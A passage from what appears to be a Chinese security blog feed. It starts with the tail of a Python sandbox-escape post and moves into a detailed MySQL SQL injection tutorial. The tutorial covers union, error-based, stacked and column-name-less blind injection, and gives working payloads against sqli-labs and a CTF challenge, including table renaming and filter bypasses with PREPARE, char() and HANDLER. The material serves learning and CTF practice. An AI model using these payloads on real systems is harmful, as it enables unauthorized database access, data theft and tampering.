中。</p><blockquote><p>限制输入字符的集合的大小</p></blockquote><p>思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。</p><p>在《OrangeKiller CTF 第 2 期》中出了 3 道题目与此相关，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p><blockquote><p>限制不能使用 <code>[a-zA-Z]</code> 的字符</p></blockquote><p>我在 <a href="https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">《从一个绕过长度限制的 XSS 中，我们能学到什么？》</a> 中提到过，Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 <code>NFKC</code>。</p><p>所以在这种情况下可以用这种姿势：</p><pre class="language-none"><code class="language-none">eval == ᵉvalPYTHON</code></pre><blockquote><p>socket + 严格的输入限制</p></blockquote><p>可以看看是否漏掉了 <code>help</code>，漏掉的话，先通过 <code>help()</code> 调起 vi/vim，然后用 <code>!</code> 指令即可 getshell :)</p><p>参考：<a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> python安全 </tag>
            
            <tag> 进阶学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入漏洞总结</title>
      <link href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/"/>
      <url>/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/</url>
      
        <content type="html"><![CDATA[<p>沙上有印，光中有</p><hr><h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><blockquote><p>system_user()——系统用户名</p><p>user()——用户名</p><p>current_user()——当前用户名</p><p>session_user()——链接数据库的用户名</p><p>database()——数据库名</p><p>version()——数据库版本</p><p>@@datadir——数据库路径</p><p>@@basedir——数据库安装路径</p><p>@@version_conpile_os——操作系统</p></blockquote><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><blockquote><p>concat(str1,str2,…)——没有分隔符地连接字符串</p><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</p></blockquote><h3 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h3><p>–+可以用#替换，url 提交过程中Url 编码后的#为%23</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span><span class="token string">'or 1=1--+"or 1=1--+)or 1=1--+'</span><span class="token punctuation">)</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span><span class="token string">") or 1=1--+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span>一般的代码为：$id<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre><p>此处考虑两个点，一个是闭合前面你的‘ 另一个是处理后面的‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者#（%23）</p><h3 id="union-操作符的介绍"><a href="#union-操作符的介绍" class="headerlink" title="union 操作符的介绍"></a>union 操作符的介绍</h3><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p><p>基本语法：</p><blockquote><p>Select 语句</p><p>Union [union 选项]</p><p>Select 语句;</p><p>Union选项：与select选项基本一样</p><p>Distinct：去重，去掉完全重复的数据（默认的）</p><p>All：保存所有的结果</p></blockquote><pre class="language-none"><code class="language-none">SELECT column_name(s) FROM table_name1UNION [distinct] --默认为distinct                 --如果允许重复值就改为AllSELECT column_name(s) FROM table_name2</code></pre><p>union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。</p><h3 id="sql-中的逻辑运算"><a href="#sql-中的逻辑运算" class="headerlink" title="sql 中的逻辑运算"></a>sql 中的逻辑运算</h3><pre class="language-none"><code class="language-none">Select * from users where id=1 and 1=1;</code></pre><p> 这条语句为什么能够选择出id=1的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。Select <em>from admin where username=’admin’ and password=’admin’我们可以用’or 1=1# 作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：Select</em> from admin where username=’admin’ and password=’’or 1=1#’  Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ andpassword=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。.</p><p>①Select <em>from users where id=1 and 1=1;</em> <em>②Select</em> from users where id=1 &amp;&amp; 1=1; ③Select * from users where id=1 &amp; 1=1; 上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。 ③的意思是id=1 条件与1 进行&amp;位操作，id=1 被当作true，与1 进行&amp; 运算结果还是1，再进行=操作，1=1,还是1（ps：&amp;的优先级大于=） Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从ascii 值反推回字符。（运用较少）</p><h3 id="order-by介绍"><a href="#order-by介绍" class="headerlink" title="order by介绍"></a>order by介绍</h3><p>在mysql中order by是用来根据校对规则对数据进行排序</p><p>基本语法：order by 字段 [asc|desc]; //asc升序，默认的</p><p>并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。</p><p>因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。</p><p>参数默认是asc，可以不用加。</p><p>当order by中的字段数为3时，由于表中字段数不足，则报错。因此可判断字段数为2.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p> 在mysql 5.0版本之后，mysql默认在数据库中存放一个”information_schema”的数据库，在该库中，需要记住三个表名，分别是schemata、tables、cliumns。</p><p> schemata表存储该用户创建的所有数据库的库名。</p><p>通过schemata表我们就可以猜数据库了</p><pre class="language-none"><code class="language-none">select schema_name from information_schema.schemata;</code></pre><p>tables表存储该用户创建的所有数据库的库名和表名。</p><p>通过tables表我们就可以猜某库的数据表</p><pre class="language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=’xxxxx’;</code></pre><p>columns表存储该用户</p><p>通过columns表我们就可以猜某表的所有列</p><pre class="language-none"><code class="language-none">Select column_name from information_schema.columns where table_name=’xxxxx’;</code></pre><p>最后获取某列的数据</p><pre class="language-none"><code class="language-none">Select xxxx from xxxx</code></pre><p><strong>当information_schema被屏蔽时，可使用其他的表</strong></p><p>可以参考这边文章：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p><strong>innodb表</strong></p><p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p><pre class="language-none"><code class="language-none">select table_name from mysql.innodb_table_stats where database_name = database(); select table_name from mysql.innodb_index_stats where database_name = database();</code></pre><p><strong>sys表</strong></p><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#包含in</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$innodb_buffer_stats_by_table<span class="token punctuation">`</span></span> <span class="token keyword">where</span> object_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>innodb_buffer_stats_by_table<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$schema_index_statistics<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>schema_auto_increment_columns<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> table_schema <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>schema_table_statistics <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> table_schema<span class="token punctuation">;</span><span class="token comment">#不包含in</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$schema_flattened_keys<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$ps_schema_table_statistics_io<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$schema_table_statistics_with_buffer<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> TABLE_SCHEMA <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> table_schema <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>x$schema_flattened_keys <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> table_schema<span class="token punctuation">;</span><span class="token comment">#通过表文件的存储路径获取表名</span><span class="token keyword">SELECT</span> <span class="token keyword">FILE</span> <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>io_global_by_file_by_bytes<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> <span class="token keyword">FILE</span> <span class="token operator">REGEXP</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">FILE</span> <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>io_global_by_file_by_latency<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> <span class="token keyword">FILE</span> <span class="token operator">REGEXP</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">FILE</span> <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>sys<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>x$io_global_by_file_by_bytes<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> <span class="token keyword">FILE</span> <span class="token operator">REGEXP</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#查询指定库的表（若无则说明此表从未被访问）</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>schema_table_statistics <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'mspwd'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> table_name<span class="token punctuation">;</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>x$schema_flattened_keys <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'mspwd'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> table_name<span class="token punctuation">;</span><span class="token comment">#统计所有访问过的表次数:库名,表名,访问次数</span><span class="token keyword">select</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token function">sum</span><span class="token punctuation">(</span>io_read_requests<span class="token operator">+</span>io_write_requests<span class="token punctuation">)</span> io <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_table_statistics <span class="token keyword">group</span> <span class="token keyword">by</span>table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">order</span> <span class="token keyword">by</span> io <span class="token keyword">desc</span><span class="token punctuation">;</span><span class="token comment">#查看所有正在连接的用户详细信息</span><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>db<span class="token punctuation">,</span>command<span class="token punctuation">,</span>current_statement<span class="token punctuation">,</span>last_statement<span class="token punctuation">,</span><span class="token keyword">time</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">session</span><span class="token punctuation">;</span><span class="token comment">#查看所有曾连接数据库的IP,总连接次数</span><span class="token keyword">SELECT</span> host<span class="token punctuation">,</span>total_connections <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>host_summary<span class="token punctuation">;</span></code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();</code></pre><p>performance_schema表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>performance_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>objects_summary_global_by_type<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>performance_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>table_handles<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>performance_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>table_io_waits_summary_by_index_usage<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>performance_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>table_io_waits_summary_by_table<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> object_name <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>performance_schema<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>table_lock_waits_summary_by_table<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> object_schema <span class="token operator">=</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();</code></pre><p>包含表文件路径的表</p><pre class="language-none"><code class="language-none">SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();</code></pre><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道<code>flag</code>所在的库和表名时，但无法获取到列名，就需要利用<strong>无列名盲注了</strong></p><h2 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h2><pre class="language-none"><code class="language-none">mysql 8.0.19`新增语句`tableTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。 可以用来盲注表名</li></ul><pre class="language-none"><code class="language-none">admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;(BINARY('{}'),'0')#</code></pre><p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p><p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p><h2 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h2><p>union 联合注入，union 的作用是将两个sql 语句进行联合。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。Union all 与union 的区别是增加了去重的功能。</p><p>并且运用information_schema的知识。</p><p>sql-labs/less-1</p><p>字符型报错</p><pre class="language-none"><code class="language-none">//order by判断字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+//通过union select判断显示的是哪些字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+//通过information_schema爆数据库http://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+//爆数据表</code></pre><p>admin’or(updatexml(1,concat(version()),1)or’1’like’1</p><p>select(group_concat(table_name)from(infromation_schema.table)where(table_schema)like(‘geek’))</p><p>select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(‘geek’))</p><p>sql-labs/less-2</p><p>整数报错</p><p>与less-1差不多 将’去除即可</p><p>sql-labs/less-3</p><p>可以成功注入的有：</p><blockquote><p>‘) or ‘1’=(‘1’ ) or 1=1 –+</p></blockquote><p>将less1 中的’ 添加）即可 ‘）</p><p>sql-labs/less-4</p><p>可以成功注入的有：</p><blockquote><p>“) or ”1”=(“1 “) or 1=1 –+</p></blockquote><p>将less1 中的‘ 更换为“)</p><p>sql-labs/less-5</p><h2 id="堆查询注射"><a href="#堆查询注射" class="headerlink" title="堆查询注射"></a>堆查询注射</h2><p>堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在SQL 中，分号（;）是用来表示一条sql 语句的结束。试想一下我们在; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>例如以下这个例子。</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql 语句，但是这种注入方式并不是十分的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。</p><pre class="language-none"><code class="language-none">以PHP为例，使用的条件为$mysqli-&gt;multi_query($sql);</code></pre><p>使用堆叠注入时，可使用的方法：</p><p>当过滤<code>select</code>时，可使用<code>handler</code>语句。<code>handler</code>语句并不具备<code>select</code>语句的所有功能。它是<code>mysql</code>专用的语句，并没有包含到<code>SQL</code>标准中</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><p>预处理：</p><pre class="language-none"><code class="language-none">prepare xxx from "sql语句";execute xxx;由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤比如过滤了selectPREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#</code></pre><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="强网杯随便注"><a href="#强网杯随便注" class="headerlink" title="强网杯随便注"></a>强网杯随便注</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">';show tables;#  看有什么表在里面1'</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token comment">#  看列</span><span class="token number">1</span><span class="token string">';show columns from `words`;# 可以发现这个表是可以回显内容的我们可以用函数将1919810931114514表改成words表，来让他自动回显RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#将新words表的flag改为id避免开始无法查询接下来还有预处理语句使用方法PREPARE name from '</span><span class="token punctuation">[</span>my <span class="token keyword">sql</span> sequece<span class="token punctuation">]</span><span class="token string">';   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句SET @tn = '</span>hahaha<span class="token string">';  //存储表名SET @sql = concat('</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">', @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句由于过滤了select可以用chr()最后payload:最终payload1'</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> jwt <span class="token keyword">from</span> concat<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' * from `1919810931114514` '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> jwt<span class="token punctuation">;</span><span class="token comment">#</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">HANDLER</span> FlagHere <span class="token keyword">OPEN</span><span class="token punctuation">;</span><span class="token keyword">HANDLER</span> FlagHere <span class="token keyword">READ</span> <span class="token keyword">FIRST</span><span class="token punctuation">;</span><span class="token keyword">HANDLER</span> FlagHere <span class="token keyword">CLOSE</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><h2 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h2><p>当我们无法获取字段时，比如information_schema被过滤，可使用无列名注入</p><h3 id="使用union-select重命名法"><a href="#使用union-select重命名法" class="headerlink" title="使用union select重命名法"></a>使用<code>union select重命名法</code></h3><pre class="language-none"><code class="language-none">mysql&gt; select * from users;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+2 rows in set (0.00 sec)mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1  | 2        | 3          |+----+----------+------------+|  1 | 2        | 3          ||  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+3 rows in set (0.00 sec)#对比可以发现使用union时，列名被替换为前面的select的列名了，为1，2，3。mysql&gt; select a.1 from (select 1,2,3 union select * from users) a;+---+| 1 |+---+| 1 || 1 || 2 |+---+3 rows in set (0.00 sec)#将前面生成的表重命名为a，再使用select a.1，查询第一列的值#可以看到，使用union查询，在不知道列名的情况下，依然能够将列注入出来，通过1，2，3选择第几列</code></pre><pre class="language-none"><code class="language-none">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;select a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;//无逗号，有join版本select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</code></pre><h3 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h3><pre class="language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'b'</span> <span class="token operator">&lt;</span> <span class="token string">'azzzzz'</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">----------------+</span><span class="token operator">|</span> <span class="token string">'b'</span> <span class="token operator">&lt;</span> <span class="token string">'azzzzz'</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----------------+</span><span class="token operator">|</span>              <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">----------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'ab'</span> <span class="token operator">&lt;</span> <span class="token string">'azzzzz'</span>   